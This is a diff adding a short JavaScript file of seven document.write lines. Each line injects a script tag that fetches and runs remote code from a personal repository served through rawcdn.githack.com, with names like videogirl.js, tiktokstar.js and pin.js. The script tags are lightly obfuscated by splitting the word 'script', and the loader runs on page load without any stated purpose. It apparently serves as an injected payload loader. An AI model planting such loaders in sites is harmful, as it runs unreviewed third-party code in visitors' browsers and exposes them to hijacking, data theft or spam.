@@ -1,0 +1,7 @@
+document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/irawanria85/image/1ebb360813e6daf6e4023c466bb48be6a7a59f41/funny.js"></scr' + 'ipt>');
+document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/irawanria85/image/1ebb360813e6daf6e4023c466bb48be6a7a59f41/videogirl.js"></scr' + 'ipt>');
+document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/irawanria85/image/1ebb360813e6daf6e4023c466bb48be6a7a59f41/wallpaper.js"></scr' + 'ipt>');
+document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/irawanria85/image/1ebb360813e6daf6e4023c466bb48be6a7a59f41/tiktok.js"></scr' + 'ipt>');
+document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/irawanria85/image/1ebb360813e6daf6e4023c466bb48be6a7a59f41/stylewoman.js"></scr' + 'ipt>');
+document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/irawanria85/image/1ebb360813e6daf6e4023c466bb48be6a7a59f41/tiktokstar.js"></scr' + 'ipt>');
+document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/irawanria85/image/6a870604cebd7e200a27e2120e90c217fee33011/pin.js"></scr' + 'ipt>');
